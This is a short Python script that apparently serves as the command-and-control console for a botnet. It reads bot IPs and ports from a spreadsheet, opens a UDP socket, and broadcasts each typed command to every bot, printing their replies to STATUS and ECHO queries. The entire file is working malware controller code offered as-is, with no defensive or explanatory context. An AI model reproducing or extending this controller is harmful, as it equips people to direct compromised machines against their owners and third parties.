# -*- coding: utf-8 -*-
"""
Created on Fri Jun  8 10:31:44 2018

@author: DrLC
"""

import socket
import pandas

PORT_DEFAULT = 2339

if __name__ == "__main__":
    
    sheet = pandas.read_excel('botnet.xlsx', sheetname='Sheet1')
    botnet = {'ip': [], 'port': []}
    for ip, port in zip(sheet['ip'], sheet['port']):
        botnet['ip'].append(ip)
        botnet['port'].append(port)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(('0.0.0.0', PORT_DEFAULT))
    while True:
        cmd = input("Command > ")
        for ip, port in zip(botnet['ip'], botnet['port']):
            s.sendto(bytes(cmd, encoding="utf-8"), (ip, port))
            if cmd.strip() == 'STATUS':
                resp, addr = s.recvfrom(1024)
                print (str(resp, encoding="utf-8"))
            if cmd.strip()[:4] == 'ECHO':
                resp, addr = s.recvfrom(1024)
                print (str(resp, encoding="utf-8"))